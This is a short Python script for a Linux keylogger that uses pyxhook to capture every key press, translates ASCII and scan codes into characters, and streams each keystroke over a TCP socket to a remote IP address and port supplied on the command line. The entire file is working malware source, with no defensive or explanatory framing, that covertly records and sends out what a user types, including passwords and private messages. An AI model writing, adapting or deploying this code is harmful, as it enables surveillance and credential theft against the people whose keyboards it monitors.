from __future__ import print_function
import sys
import os
import pyxhook
import socket
import argparse
 
def OnKeyPress(event, params):
	key = event.Key
	if event.Ascii is 13 or event.ScanCode is 104:
		key = "\n"
	if event.Ascii is 33:
		key = "!"
	if event.Ascii is 34:
		key = '"'
	if event.Ascii is 36:
		key = "$"
	if event.Ascii is 39:
		key = "'"
	if event.Ascii is 42:
		key = "*"
	if event.Ascii is 58:
		key = ":"
	if event.Ascii is 59:
		key = ","
	if event.Ascii is 95:
		key = "_"
	if event.Ascii is 249:
		key = "ù"
	if event.ScanCode is 63:
		key = "*"
	if event.ScanCode is 79:
		key = "7"
	if event.ScanCode is 80:
		key = "8"
	if event.ScanCode is 81:
		key = "9"
	if event.ScanCode is 82:
		key = "-"
	if event.ScanCode is 83:
		key = "4"
	if event.ScanCode is 84:
		key = "5"
	if event.ScanCode is 85:
		key = "6"
	if event.ScanCode is 86:
		key = "+"
	if event.ScanCode is 87:
		key = "1"
	if event.ScanCode is 88:
		key = "2"
	if event.ScanCode is 89:
		key = "3"
	if event.ScanCode is 90:
		key = "0"
	if event.ScanCode is 106:
		key = "/"
	
	params["socket"].send(key.encode())

def argsParser():
	parser = argparse.ArgumentParser()
	parser.add_argument("destination", help="Destination IP Address")
	parser.add_argument("port", type = int, help="Destination Port")
	return parser.parse_args()

def Main(IP, PORT):
	
	try:
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		sock.connect((IP, PORT))

		parameters = {"socket":sock}
 
		hookman = pyxhook.HookManager(parameters=True)
		hookman.KeyDown = OnKeyPress

		hookman.KeyDownParameters = parameters

		hookman.HookKeyboard()
		
		hookman.start()
	except socket.gaierror:
		print("Error: Destination IP Address is not valid")
	except OverflowError:
		print("Error: Destination Port must be 0-65535")
	except ConnectionRefusedError:
		print("Error: Destination Unreachable")
	except KeyboardInterrupt:
		hookman.cancel()
		sock.close()

if __name__ == "__main__":
	args = argsParser()
	Main(args.destination, args.port)
